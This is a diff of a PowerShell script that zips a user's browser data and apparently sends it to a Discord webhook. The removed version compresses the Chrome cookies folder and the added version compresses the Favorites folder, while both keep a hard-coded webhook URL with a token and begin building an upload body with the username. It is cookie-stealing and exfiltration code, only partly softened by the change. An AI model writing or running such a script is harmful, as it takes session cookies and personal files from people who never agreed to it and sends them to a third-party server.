@@ -1,14 +1,14 @@
 ############################################################################################################################################################
 
-# Get the current user's Cookies folder
-$CookiesPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Network"
+# Get the current user's Favorites folder
+$FavoritesPath = "$env:USERPROFILE\Favorites"
 
 # Set the name for the zip file
-$FolderName = "CookiesBackup"
+$FolderName = "FavoritesBackup"
 $ZIP = "$FolderName.zip"
 
-# Compress the Cookies folder into a zip
-Compress-Archive -Path $CookiesPath -DestinationPath $env:tmp/$ZIP
+# Compress the Favorites folder into a zip
+Compress-Archive -Path $FavoritesPath -DestinationPath $env:tmp/$ZIP
 
 ############################################################################################################################################################
 
@@ -22,7 +22,7 @@ param (
     [string]$text 
 )
 
-$hookurl = "https://discord.com/api/webhooks/1296512231965593703/J2pJO0xKn1b4dGrYgRAgjRBbDQTug_armw3ak9DJCSTGjGCZavlBss9-R-MEwvW9Fqhi';irm"
+$hookurl = "https://discord.com/api/webhooks/1296512231965593703/J2pJO0xKn1b4dGrYgRAgjRBbDQTug_armw3ak9DJCSTGjGCZavlBss9-R-MEwvW9Fqhi"
 
 $Body = @{
   'username' = $env:username
